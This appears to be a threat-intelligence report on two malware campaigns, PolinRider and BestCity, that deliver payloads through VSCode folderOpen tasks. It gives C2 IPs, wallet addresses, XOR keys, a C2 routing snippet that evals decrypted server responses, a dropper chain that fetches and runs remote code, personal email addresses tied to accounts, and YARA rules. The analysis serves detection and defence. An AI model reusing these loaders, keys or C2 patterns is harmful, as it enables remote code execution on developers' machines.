# Malicious Repository Campaign — C2 Infrastructure Overview

*Two distinct actor clusters sharing the VSCode `folderOpen` delivery vector*  
*Last updated: 2026-06-29 — Tasks A–AC*

---

## Cluster Summary

| Cluster | Attribution | C2 mechanism | Status |
|---------|-------------|--------------|--------|
| **PolinRider / TRON blockchain** | Unknown (advanced, persistent) | TRON wallet → BSC tx → XOR → JS | Active |
| **BestCity / Contagious Interview** | Lazarus / Famous Chollima (high confidence) | HTTPS dead-drop (jsonkeeper.com) | C2 dead |

---

---

## Cluster 1: PolinRider / TRON Blockchain Campaign

---

## Task Status

| Task | Status | Topic |
|------|--------|-------|
| A | DONE | W1 Stage 1 `_$_9f51` full decode |
| B | DONE | W2 Stage 1 `_$_16d1` decode + direct HTTP C2 architecture |
| C | DONE | Live Stage 2 retrieval (77,279-char Beavertail RAT) |
| D | DONE | npm package analysis (6 packages) |
| E | SKIPPED | TrustedSmartChain notification (cancelled) |
| F | DONE | Cross-reference with OpenSourceMalware repo list |
| G | DONE | GitHub scan for new ciphers (`_$_16d1`, `_$_9f51`, `_$_96c7`, `_$_4445` — all zero-result) |
| H | DONE | `config.bat` analysis (timestamp-forgery commit amender) |
| I | **DONE** | Aptos address tx history — mechanism confirmed, op dates to Jun 2025, new cipher `_$_f5f0` |
| J | pending | TRON W1 update cadence monitoring |
| K | pending | TrustedSmartChain/tsc main repo infection check |
| L | DONE | Bat-file victim repos sweep (29 repos, 7 live infections) |
| M | DONE | Decode `Cot%3t=shtP` cipher from herasoftlabs/ChainLab |
| N | DONE | `saif72437` full infection sweep (57 repos, 9 infected) |
| O | DONE | `_$_1e42` 2509/1358 cluster C2 mapping |

---

## Wallets × Campaigns

| Wallet | Chain | Role | Present in |
|--------|-------|------|-----------|
| `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | TRON (W1) | Stage 0/1 dead-drop, W1 delivery channel | **ALL waves** — `_$_1e42`, `Cot%3t=shtP`, `_$_913e`, `_$_b229`, `_$_4445`; also stored as `global['_t_1']` in W2 Stage 2 |
| `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | TRON (W2) | Stage 0/1 dead-drop, W2 delivery channel | **ALL waves** — same set; decoded from `_$af163278` string table (Task O) |
| `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | TRON (W3) | Stage 2 dead-drop — delivers Beavertail RAT body | `_$_b229` / `_$_9f51` wave only (Jun 2026) |
| `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | Aptos (A1) | Blockchain fallback dead-drop | ALL waves — in `_$_9f51`; stored as `global['_t_2']` in W2 Stage 2 |
| `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3` | Aptos (A2) | Blockchain fallback dead-drop | ALL waves — in `_$_9f51` |

**Key observation:** TRON W1 and W2 are present in every cipher variant analyzed — the wallets never rotated. Only the JS obfuscation wrapper (cipher family) changed in response to detection.

**Pre-positioning started at least as early as January 2023.** Task AI confirmed 7 `astro.config.mjs` infections with commit dates before June 2025, the earliest being `iSebasC/Astro` (campaign ID `8-1821-1`) committed in January 2023. These payloads contain the same W1/W2 wallet addresses and blockchain dead-drop logic — but those wallets had no transactions until June 2025. The actor planted infections 2+ years before activating C2, maintaining the same infrastructure throughout. This places the C2 *design* in operation by 2023 and *activation* in June 2025.

### TRON Wallet Transaction History (known dead-drops)

**W1 `TMfKQEd7...`** — most recent first:

| TRON TX | Date (UTC) | → BSC TX |
|---------|-----------|---------|
| `baf00565...` | 2026-06-23 02:35 | `0x18a8420f727f2405f9d1805ad887b31029b584b2ff5a7ec0f57c72635183e99d` |
| `ff86aec0...` | 2026-06-18 13:09 | `0xb73920732115ab3a0ae8d9ecd28666670d271bee77d29692ff29505fd9a1a6b2` |
| `914e5e07...` | 2026-05-23 16:16 | `0x80a1148ee589125bc1e57d36abac9f08089b2990d9372be3a33a1f057ad1ef89` |

**W2 `TXfxHUet...`:**

| TRON TX | Date (UTC) | → BSC TX |
|---------|-----------|---------|
| `3a2b5067...` | 2026-06-20 13:37 | `0x7ffb4efddd96e20aec90724be2ac9a71c138a9af697b9fb8224bbf80ea4f22be` |
| `fc005f15...` | 2026-03-26 15:13 | `0xa896af4f2876df59af1e705fb75031630ebd37fa89659a9896be4d3da8c87f02` |

**W3 `TA48dct6...`** (Stage 2 delivery):

| TRON TX | Date (approx) | → BSC TX |
|---------|--------------|---------|
| `08685820...` | ~2026-06-08 | `0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968` |
| `f16931ee...` | ~2026-06-04 | `0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f` |
| `8b2c39c6...` | ~2026-06-02 | `0x54b8bde10ea26d9ae0702e6e590f0af3e500cb14fda876e908620760ac32b76c` |

---

## C2 IPs × Campaigns

| IP | Port(s) | Role | Routing trigger | Found in |
|----|---------|------|-----------------|---------|
| `166.88.134.62` | 443 | Admin / operator test pool | campaign `_V` = `admin` string | W1 Stage 1 `_$_9f51` only |
| `198.105.127.210` | 80, 443 | Production victim handler | numeric `_V` OR mixed `N-N-NNN` format | W1 `_$_9f51`, W2 `_$_a478` |
| `23.27.202.27` | 443, 27017 | MongoDB backend / HTTP fallback | else-branch when `_H` is set | W1 `_$_9f51`, W2 `_$_a478` |
| `23.27.13.43` | 80 | Old `_$_1e42` batch victim handler | `_V` starts with `'A'` | W2 Stage 2 `_$_a478` only — new, Task B |

### C2 Routing Logic (W2 Stage 2 `_$_a478`)

```javascript
var r = global['_V'] || 0;

if (r[0] == 'A') {
    global['_H2'] = 'http://23.27.13.43';         // old _$_1e42 batch → dedicated server
} else if (!isNaN(parseInt(r))) {
    global['_H2'] = 'http://198.105.127.210';      // numeric IDs → production
} else {
    global['_H']  = 'http://198.105.127.210';      // new-wave (e.g. '5-3-161')
    global['_H2'] = 'http://23.27.202.27:27017';   // MongoDB fallback
}

// Beacon: GET (global['_H'] || global['_H2']) + '/$/boot'
// Header: Sec-V: <campaign_id>
// Response: XOR-decrypt with 'ThZG+0jfXE6VAGOJ' → eval(Stage3)
```

Campaign ID format → routed server:

| `_V` format | Example | Routed to |
|-------------|---------|-----------|
| Starts with `'A'` | `'A8-765'` | `23.27.13.43` |
| Pure numeric | (unknown) | `198.105.127.210` |
| Mixed `N-N-NNN` | `'5-3-161'` | `198.105.127.210` (fallback: `23.27.202.27:27017`) |
| `'admin'` | (operator) | `166.88.134.62` (W1 path only) |

### C2 Routing Logic (W1 Stage 1 `_$_9f51`)

W1 Stage 1 routes via a 17-entry string table with separate `_H` / `_H2` / `_H3` pools.
See `ANALYSIS_STAGE1_b229_live.md` for full decode.

---

## XOR Keys × Channel

| Key | Channel | Decrypts |
|-----|---------|---------|
| `2[gWfGj;<:-93Z^C` | W1 (TRON `TMfKQEd7...`) | BSC `input` field → Stage 1 plaintext |
| `m6:tTh^D)cBz?NM]` | W2 (TRON `TXfxHUet...`) | BSC `input` field → Stage 1 plaintext |
| `ThZG+0jfXE6VAGOJ` | W2 HTTP Stage 3 | C2 server `/$/boot` HTTP response → Stage 3 eval |

Both W1/W2 channel keys appear **identically** across every cipher variant from `_$_1e42`
through `_$_b229`. The cryptographic layer never rotated — only the JS obfuscation wrapper changed.

---

## Cipher Evolution × Campaign Timeline

| Cipher | First seen | Campaigns / repos | Delivery | Status |
|--------|-----------|-------------------|----------|--------|
| `sfL` raw IIFE (no outer cipher) | **≥2023-01** | `astro.config.mjs` cluster (29+ repos, IDs `8-xxxx`/`9-xxxx`) | W1+W2 TRON→BSC | Dormant until June 2025 activation; **still undetected in most repos** |
| `_$_1e42` / `MDy` | ≥2026-01 | saif72437 (Jun 15, 57 repos), bat-file cluster (OSM Apr list) | W1+W2 TRON→BSC | Detected — OSM YARA `rmcej_otb_payload` (Mar 7) |
| `Cot%3t=shtP` | ≥2026-01 | herasoftlabs/ChainLab + 5 live repos | W1+W2 TRON→BSC | Still live in ≥5 repos |
| `_$_46e0` | 2026-02-22 | 5-3-161 (zurichjs) | W1+W2 TRON→BSC | Cleaned May 2026 |
| `_$_913e` | 2026-05-13 | 5-3-225/252/296/298/341, 5-2-328 | W1+W2 TRON→BSC | Still live in ≥9 external repos |
| `_$_b229` | 2026-06-03 | 5-4-39, 5-167 | W1+W2 TRON→BSC | Still live |
| `_$_4445` | 2026-06-26 | 5-2-319 (zurichjs) | W1+W2 TRON→BSC | Cleaned ~6h after injection |
| `_$_16d1` | W2 Stage 1 (Jun 20) | Not yet found in repos | Direct HTTP | New — not publicly documented |
| `_$_9f51` | W1 Stage 1 (Jun 23) | Not yet found in repos | TRON→BSC chain | New — not publicly documented |
| `_$_96c7` | Embedded in W1 Stage 1 atob | Sub-cipher for Stage 2 bootstrap | — | New — not publicly documented |
| `_$_f5f0` | W2 Stage 1 (Jun 23 + Jun 25) | Not yet found in repos | Direct HTTP | New — adds `global['m']=module` |
| (none/raw IIFE) | W1 Stage 1 (Aug 2025, cipher `RVj`) | Oldest known variant | TRON→BSC | No outer wrapper — earliest form |

---

## Delivery Architecture

Two parallel delivery tracks share the same wallet/blockchain infrastructure:

```
                    ┌─ TRON W1 (TMfKQEd7...) ──► BSC TX ──► XOR '2[gWfGj...' ──► Stage 1 (W1)
                    │                                                                    │
Actor C2 ───────────┤                                                                    ▼
                    │                                                        W3 TRON → BSC → Stage 2
                    │                                                        (77,279-char Beavertail RAT)
                    │
                    └─ TRON W2 (TXfxHUet...) ──► BSC TX ──► XOR 'm6:tTh...' ──► Stage 1 (W2)
                                                                                        │
                                                                                        ▼
                                                                           Direct HTTP GET /$/boot
                                                                           Sec-V: <campaign_id>
                                                                           XOR 'ThZG+0jfXE6VAGOJ'
                                                                                        │
                                                                                        ▼
                                                                                    Stage 3 (live)
```

- **W1 path** — blockchain-obfuscated, no actor IP visible until Stage 1 decode. Delivers full Beavertail RAT.
- **W2 path** — lightweight beacon, actor IPs visible in Stage 2 string table. Stage 3 served live per-victim.

Both paths converge: TRON wallets, Aptos fallbacks, BSC separator `?.?`, and the `_$_9f51` / `_$_16d1` cipher structure are shared.

---

## Network Detection Signatures

```
# Direct C2 beacon (W2 path — detectable on network)
GET /$/boot HTTP/1.1
Host: 23.27.13.43 | 198.105.127.210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36
Sec-V: <campaign_id>

# BSC RPC calls (W1+W2 path — blockchain dead-drop polling)
POST https://bsc-dataseed.binance.org/
POST https://bsc-rpc.publicnode.com/
{"method":"eth_getTransactionByHash","params":["0x..."]}

# TRON API polling
GET https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions
GET https://api.trongrid.io/v1/accounts/TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG/transactions

# YARA (host)
rule PolinRider_W2_Boot_Beacon {
    strings:
        $path  = "/$/boot" ascii
        $secv  = "Sec-V" ascii
        $key   = "ThZG+0jfXE6VAGOJ" ascii
        $ip1   = "23.27.13.43" ascii
        $ip2   = "198.105.127.210" ascii
    condition:
        2 of them
}

rule PolinRider_XOR_Keys {
    strings:
        $k1 = "2[gWfGj;<:-93Z^C" ascii
        $k2 = "m6:tTh^D)cBz?NM]" ascii
        $k3 = "ThZG+0jfXE6VAGOJ" ascii
        $sep = "?.?" ascii
    condition:
        any of them
}
```

---

## Cluster 2: BestCity / Contagious Interview Campaign

**See also:** `ANALYSIS_AC_BESTCITY_CLUSTER.md` for full decode.

**Attribution:** Lazarus Group / Famous Chollima sub-cluster ("Contagious Interview") — high
confidence based on delivery vector, multi-layer WJS obfuscation with tamper detection,
fabricated git history with fake personas, and fake job-offer pretext. **No shared IOCs with
PolinRider.** These are independent actors using the same VSCode `folderOpen` delivery vector.

---

### Repos

| Repo | Account created | Payload | Size | Type |
|------|----------------|---------|------|------|
| `technoknol/bestcity` | 2014 (victim) | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | 3-layer WJS IIFE |
| `AbstractFruitFactory/bestcity-demo` | 2014 (victim) | `public/fontawesome/fa-solid-400.woff2` | 55,985 B | 3-layer WJS IIFE (byte-identical) |
| `fullstackragab/bestcity` | 2021 (victim) | `webfonts/fa-brands-regular.woff2` | 9,357 B | obfuscator.io |
| `BestCity-v1/Demo-v1` | 2025-12-22 (**actor**) | `webfonts/fa-brands-regular.woff2` | 147,449 B | obfuscator.io |

`technoknol` and `AbstractFruitFactory` are real developer accounts co-opted as bait.
`BestCity-v1` is actor-created (3 days before first commit, no profile, single payload repo).
`fullstackragab` and `BestCity-v1/Demo-v1` share an identical 100-commit LLM-generated history.

---

### Execution Chain

```
Victim opens repo in VSCode
  │
  └─ tasks.json folderOpen → node ./public/fontawesome/fa-solid-400.woff2
       │
       └─ Layer 1 (55,985 B WJS IIFE)
            TZ8C: rolling XOR hash of Qm9K.toString() → decryption key
            DHlD: XOR-decrypt URL-encoded payload with key
            (tamper detection: source change → wrong key → SyntaxError)
            │
            └─ Layer 2 (19,016 B, decrypted)
                 Sets up dnQo string table; executes Layer 3
                 │
                 └─ Layer 3 dropper (plaintext)
                      fs.writeFileSync('/tmp/programx64/main.js', dropper_code)
                      execSync('cd "/tmp/programx64" && npm install axios && node main.js')
                      │
                      └─ main.js (written to disk)
                           process.title = 'Node.js JavaScript Runtime'  ← evasion
                           axios.get(atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi84NVFHSA=='))
                           → https://www.jsonkeeper.com/b/85QGH  [DEAD — 404]
                           new (Function.constructor)('require', res.data.model)(require)
```

---

### C2 Architecture

| Element | Value |
|---------|-------|
| Dead-drop | `https://www.jsonkeeper.com/b/85QGH` (public JSON pastebin) |
| Dead-drop status | **DEAD** — 404 as of 2026-06-29 |
| Stage fetch field | `res.data.model` |
| Execution method | `new (Function.constructor)('require', payload)(require)` |
| Temp path | `/tmp/programx64/main.js` |
| npm deps silently installed | `axios`, `request` |
| Process evasion | `process.title = 'Node.js JavaScript Runtime'` |

---

### IOCs

| Type | Value |
|------|-------|
| C2 URL | `https://www.jsonkeeper.com/b/85QGH` |
| Temp dropper path | `/tmp/programx64/main.js` |
| Process title | `Node.js JavaScript Runtime` |
| Actor account | `BestCity-v1` (GitHub, created 2025-12-22) |
| Actor commit email | `forbesmike200@gmail.com` (technoknol repo) |
| Actor commit email | `williamherr8@gmail.com` (AbstractFruitFactory initial) |
| Actor commit email | `alexander.wormbs@gmail.com` (AbstractFruitFactory subsequent) |
| Fake persona email | `nicolasmelo12@gmail.com` |
| Fake persona email | `myselfmail0301@gmail.com` |
| Fake persona email | `Fiddlekins@gmail.com` |
| Fake persona email | `sbegaa@gmail.com` |

---

### Detection Signatures

```
# Filesystem (host)
/tmp/programx64/main.js  ← dropper staging path

# Process (host)
process.title == 'Node.js JavaScript Runtime'  ← masquerading node process

# Network (dead but signature still useful for historical detection)
GET https://www.jsonkeeper.com/b/85QGH

# YARA (host — WJS tamper-detection pattern)
rule BestCity_WJS_TamperDetect {
    strings:
        $tz8c  = "function TZ8C" ascii
        $dhlD  = "function DHlD" ascii
        $qm9k  = "function Qm9K" ascii
        $tpath = "/tmp/programx64" ascii
    condition:
        2 of them
}

rule BestCity_Dropper {
    strings:
        $path  = "/tmp/programx64/main.js" ascii
        $ptit  = "Node.js JavaScript Runtime" ascii
        $c2    = "jsonkeeper.com/b/85QGH" ascii
    condition:
        any of them
}
```

---

### Cluster Comparison

| Property | PolinRider / TRON | BestCity / Contagious Interview |
|----------|-------------------|--------------------------------|
| Attribution | Unknown (advanced persistent) | Lazarus / Famous Chollima |
| Delivery vector | VSCode `folderOpen` / npm packages | VSCode `folderOpen` |
| C2 mechanism | TRON wallet → BSC blockchain → XOR | HTTPS GET to jsonkeeper.com pastebin |
| Blockchain | TRON + Aptos + BSC | None |
| Obfuscation | Custom XOR shuffle cipher (`sfL`, `_$_xxxx`) | WJS IIFE with self-keying XOR tamper detection |
| Persistence | Detached `child_process.spawn` | npm install + `node main.js` |
| Stage delivery | 2+ on-chain dead-drops | 1 HTTP dead-drop (dead) |
| Fake git history | No | Yes — 100-commit LLM-generated, 4 personas |
| Pretext | Infected developer repos | Fake job interview |
| C2 status | Active (as of 2026-06-29) | Dead (404) |
| Shared IOCs | — | None with PolinRider |
